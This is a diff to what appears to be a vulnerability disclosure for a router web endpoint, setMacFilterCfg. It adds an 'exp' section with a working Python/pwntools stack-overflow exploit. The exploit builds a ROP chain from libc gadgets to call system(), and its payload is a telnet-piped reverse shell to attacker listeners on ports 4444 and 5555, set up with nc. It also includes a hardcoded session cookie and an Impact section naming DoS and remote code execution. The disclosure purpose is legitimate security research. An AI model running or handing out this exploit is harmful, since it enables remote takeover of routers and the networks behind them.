@@ -37,6 +37,32 @@ print(response.text)
 ```
 ![PoC 2 Result: Root Directory Listing](./imgs/2.png)
 
+## exp
+Open two terminals and execute nc -l 4444 and nc -l 5555 respectively. One is used for executing commands, and the other for echoing commands. Then open a third terminal to run the exp：
+```python
+from pwn import *
+import requests
+
+url = "http://(target_ip)/goform/setMacFilterCfg"
+libc_base=0xff58b000 #it will be diffirent
+libc=ELF("/lib/libc.so.0") #your own path
+print(hex(libc.sym['system']))
+#print(hex(libc.sym['puts']))
+system=libc_base+libc.sym["system"]
+#puts = libc_base+libc.sym['puts']
+mov_r0 = libc_base+0x00040cb8 # mov r0, sp; blx r3;
+pop_r3 = libc_base+0x00018298 # pop {r3, pc};
+#payload1 = cyclic(176)+p32(pop_r3)+p32(puts)+p32(mov_r0)+b"hacked by n0ps1ed\x00"
+payload2 = cyclic(176)+p32(pop_r3)+p32(system)+p32(mov_r0)+b"telnet 192.168.xx.xxx 4444 | /bin/sh | telnet 192.168.xx.xxx 5555\x00"
+cookie = {"Cookie": "password=rfl1qw"}
+data = {"macFilterType": "black", "deviceList": b"\r" + payload2}
+res = requests.post(url, cookies=cookie, data=data)
+res = requests.post(url, cookies=cookie, data=data)
+print(res.text)
+
+```
+![PoC 2 Result: Root Directory Listing](./imgs/3.png)
+
 ## Impact
 - **Denial of Service (DoS)**: The oversized payload crashes the router’s web server, disrupting network connectivity and management access.
 - **Remote Code Execution (RCE)**: With a crafted ROP chain, attackers can execute arbitrary commands.
